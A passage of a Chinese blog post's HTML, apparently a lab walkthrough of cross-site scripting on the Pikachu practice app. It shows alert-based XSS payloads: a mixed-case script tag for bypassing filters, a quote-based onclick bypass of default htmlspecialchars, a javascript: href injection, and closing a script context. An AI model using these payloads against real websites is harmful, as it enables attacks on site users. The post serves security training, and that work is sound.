+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;  &lt;!--不成功--&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ScRIPT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRIPT</span>&gt;</span></span>  &lt;!--成功--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​                                                      <img src="https://s2.loli.net/2023/12/21/howbZgRGB8zdTun.png" alt="image-20231221005024195" style="zoom:135%;" /></p>
+</li>
+</ul>
+<h5 id="6-xss之htmlspecialchars绕过"><a href="#6-xss之htmlspecialchars绕过" class="headerlink" title="6.xss之htmlspecialchars绕过"></a>6.<strong>xss之htmlspecialchars绕过</strong></h5><p>​                                                             <img src="https://s2.loli.net/2023/12/21/OT9ZvKUFRXIaNsH.png" alt="image-20231221010120305" style="zoom:65%;" /></p>
+<ul>
+<li><p>当htmlspecialchars()使用默认参数时单引号不会被过滤，可以使用q'onclick='alert(1111)' 进行xss注入</p>
+<p><img src="https://s2.loli.net/2023/12/21/p9U3z4mNYOfbsrC.png" alt="image-20231221010408833"></p>
+</li>
+<li><p>点击q'onclick='alert(1111)' 执行alert(1111)</p>
+</li>
+</ul>
+<p>​                                                            <img src="https://s2.loli.net/2023/12/21/xqd2EbY3HWRJ5Tt.png" alt="image-20231221010458689" style="zoom:90%;" /></p>
+<h5 id="7-xss之输出点"><a href="#7-xss之输出点" class="headerlink" title="7.xss之输出点"></a>7.xss之输出点</h5><ul>
+<li><p><strong>href输出点</strong></p>
+<p><img src="https://s2.loli.net/2023/12/21/pvAoP2HZ3YKOwbN.png" alt="image-20231221012812997"></p>
+<ul>
+<li><p>随便输入“‘test 后通过查看页面源码可以知道输出点为href</p>
+<p><img src="https://s2.loli.net/2023/12/21/TPYtzkAZUG1bOFs.png" alt="image-20231221013055860"></p>
+</li>
+<li><p>可以注入 javascript:alert('xss') , 在href中 JavaScript: ~ 可以被执行</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>​                                                             <img src="https://s2.loli.net/2023/12/21/XFzPBYowir9MIul.png" alt="image-20231221032928717" style="zoom: 80%;" /></p>
+<ul>
+<li><p><strong>js输出点</strong></p>
+<p><img src="https://s2.loli.net/2023/12/21/ZypaEVLKgkoG6Aq.png" alt="image-20231221033036626"></p>
+<ul>
+<li><p>输入“‘<>test 提交后查看页面源码，可以发现“‘<>被输出到JavaScript代码中</p>
+<img src="https://s2.loli.net/2023/12/21/myDwOZLJE7AhdRl.png" alt="image-20231221033321298" />
+
+
+</li>
+<li><p>只要xss注入时 将js提前闭合即可</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#<span class="string">&#x27;&lt;/script&gt;&lt;script&gt;alert(&#x27;</span>xss<span class="string">&#x27;)&lt;/script&gt; </span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://s2.loli.net/2023/12/21/kZKYzjUBe4NVE9I.png" alt="image-20231221033931031"></p>
+</li>
+</ul>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://RuiJiLuo.github.io">Rui Ji</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://ruijiluo.github.io/2023/12/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/">http://ruijiluo.github.io/2023/12/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://RuiJiLuo.github.io" target="_blank">RJ の 博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/12/20/4dJUfz6p5ygLsZu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="SQL Inject漏洞"><img class="cover" src="https://s2.loli.net/2024/03/01/oVUWrJSki5dLEeX.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL Inject漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/20/HVV%E7%AC%94%E8%AE%B0/" title="XSS跨站脚本"><img class="cover" src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XSS跨站脚本</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Rui Ji</div><div class="author-info__description">私 の hacker 夢</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ruijiluo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80-XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%89%E6%A6%82%E8%BF%B0"><span class="toc-text">一.XSS（跨站脚本）概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C-XSS%E5%B8%B8%E8%A7%81%E7%B1%BB%E5%9E%8B-%E5%9F%BA%E4%BA%8EPikachu"><span class="toc-text">二.XSS常见类型(基于Pikachu)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-text">1.反射型xss</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-text">2.存储型xss</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-DOM%E5%9E%8Bxss"><span class="toc-text">3.DOM型xss</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89-xss%E5%AE%9E%E9%AA%8C%E6%A1%88%E4%BE%8B-%E5%9F%BA%E4%BA%8EPikachu"><span class="toc-text">三.xss实验案例(基于Pikachu)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E9%80%9A%E8%BF%87xss%E8%8E%B7%E5%8F%96cookie%E5%8F%8Axss%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E4%BD%BF%E7%94%A8"><span class="toc-text">1.通过xss获取cookie及xss管理后台使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-xss%E9%92%93%E9%B1%BC-%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-text">2.xss钓鱼(存储型xss)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-xss%E8%8E%B7%E5%8F%96%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-text">3.xss获取键盘记录</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/14/pwn/" title="pwn"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn"/></a><div class="content"><a class="title" href="/2024/11/14/pwn/" title="pwn">pwn</a><time datetime="2024-11-14T09:15:12.000Z" title="发表于 2024-11-14 17:15:12">2024-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/app%E6%B8%97%E9%80%8F/" title="app渗透"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="app渗透"/></a><div class="content"><a class="title" href="/2024/09/12/app%E6%B8%97%E9%80%8F/" title="app渗透">app渗透</a><time datetime="2024-09-12T11:35:21.000Z" title="发表于 2024-09-12 19:35:21">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透"/></a><div class="content"><a class="title" href="/2024/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">内网渗透</a><time datetime="2024-09-12T11:32:28.000Z" title="发表于 2024-09-12 19:32:28">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="代码审计"/></a><div class="content"><a class="title" href="/2024/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">代码审计</a><time datetime="2024-09-12T11:31:50.000Z" title="发表于 2024-09-12 19:31:50">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/js%E9%80%86%E5%90%91/" title="js逆向"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="js逆向"/></a><div class="content"><a class="title" href="/2024/09/12/js%E9%80%86%E5%90%91/" title="js逆向">js逆向</a><time datetime="2024-09-12T11:31:20.000Z" title="发表于 2024-09-12 19:31:20">2024-09-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Rui Ji</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
